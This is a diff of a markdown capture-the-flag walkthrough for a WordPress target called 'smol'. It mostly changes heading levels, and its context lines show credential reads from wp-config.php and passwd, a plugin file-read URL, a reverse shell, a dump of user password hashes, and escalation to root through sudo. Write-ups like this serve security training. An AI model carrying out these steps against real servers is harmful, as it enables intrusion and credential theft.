@@ -79,7 +79,7 @@ define( 'DB_USER', '-REDACTED-' );
 /** Database password */
 define( 'DB_PASSWORD', 'kb-REDACTED-Z%G' );
 ```
-#### Step 1 - Find a login user 
+### Step 1 - Find a login user 
 
 
 Check local users in passwd files:
@@ -100,7 +100,7 @@ Check password & user from mysql section in wp-config.php
 
 log in successfull by - REDACTED - 
 
-#### Step 2 - log in to WP
+### Step 2 - log in to WP
 
 We have an access to wp  
 
@@ -108,7 +108,7 @@ Checking WP version:
 
 [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 
-#### ** Rabbit-hole ** - GOTO Step 3!
+### ** Rabbit-hole ** - GOTO Step 3!
 
 Wordpress 6.4.3 is vulnerable "avatar XSS" CVE-2024-4439 Exploit: Unauthenticated Stored Cross-Site Scripting Vulnerability in WordPress Core
 
@@ -136,7 +136,7 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 
 # Task 1 part 2 Web login to reverse shell 
 
-#### Step 3 - GO back to enumerate wp inside
+### Step 3 - GO back to enumerate wp inside
 
 
 We can find a "Webmaster Tasks!!" private page. 
@@ -197,7 +197,7 @@ pwd; id; sudo -l
 uid=33(www-data) gid=33(www-data) groups=33(www-data) 
 ```
 
-#### Step 4 privesc [1]
+### Step 4 privesc [1]
 
 Open mysql wordpress database and find hashes for users:
 
@@ -205,6 +205,7 @@ www-data@smol:/home$ mysql -u wpuser -p wordpress
 mysql -u -REDACTED- -p wordpress
 Enter password: -REDACTED-
 
+```
 mysql> select * from wp_users ;
 select * from wp_users ;
 +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
@@ -219,6 +220,7 @@ select * from wp_users ;
 +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
 6 rows in set (0.00 sec)
 
+```
 
 Create hashes file for Johny 
 
@@ -254,7 +256,7 @@ pwd
 diego@smol:~$ 
 ``
 
-#### Step 5 privesc [2]
+### Step 5 privesc [2]
 
 We are in the group internal so we can check 'think's ssh keys and we have access to all of these files. 
 
@@ -286,7 +288,7 @@ internal:x:1005:diego,gege,think,xavi
 
 ```
 
-#### Step 6 privesc [3]
+### Step 6 privesc [3]
 
 jump to gege and move file to local. 
 
@@ -325,7 +327,7 @@ Session completed.
 
 ```
 
-#### Step 7 privesc [4]
+### Step 7 privesc [4]
 
 Unzip the file and view wp-config.php. xavi password: -----REDACTED-----
 
@@ -342,7 +344,7 @@ User xavi may run the following commands on smol:
 xavi@smol:~$ sudo bash
 ```
 
-#### Step 8 privesc [5]
+### Step 8 privesc [5]
 
 xavi is a full sudo user so we can move to root. 
 
